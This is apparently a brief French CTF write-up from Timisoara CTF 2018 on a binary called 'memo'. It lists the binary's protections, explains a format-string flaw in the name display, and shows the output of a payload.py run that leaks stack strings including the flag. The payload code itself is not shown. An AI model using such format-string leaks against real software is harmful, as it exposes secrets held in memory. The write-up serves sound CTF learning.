---
layout: post
title: "Timisoara
date: 20 Avril 2018
comments: true
categories: wu
auteur: françois
---
```
===== INFOS ===== 
Filename                 memo
File format              ELF64
Architecture             x86-64
Endianess                little endian
Entry point              0x400a00
Loadables segments       2
Sections                 29

NX bit                   enabled
SSP                      disabled
Relro                    partial
RPATH                    no rpath
RUNPATH                  no runpath
PIE                      disabled
```

Le programme présent eune faille format dans l'affichage du nom à la fin de la
partie. Or le flag est lu à un moment en mémoire au début de main.
Un affichage de toutes les chaines pointées par les mots sur la pile donne le 
résultat:

francois@aramis:~/BFF/Timisoara/Memo$ python payload.py  SILENT
 You have a very good memory n? 
 
 H=���s1�H\x83�\xfe�
 
 g5d\xb4\x7f
 Let's play
 Your name? > 
 (null)
 (null)
 \xa0\x8c\h
 (null)
 (null)
 (null)
 UH\x89�H�� H\xbf%\x13@
 UH\x89�H�� H\xbf%\x13@
 UH\x89�H�� H\xbf%\x13@
 1�I��^H\x89�H���PTI���@
 timctf{t0_4rr1ve_4t_th3_s1mple_is_d1ff1cult}
 (null)
 AWAVA\x89\xffAUATL\x8d%\x86\x0c 
 \x89����
 @\x8f\x80=�
 UH\x89�H��
 (null)
 1�I��^H\x89�H���PTI���@
 
 (null)
 (null)
 (null)
 (null)
 (null)
 Eo�%�
 
 �\x1f
 (null)
 (null)
 1�I��^H\x89�H���PTI���@
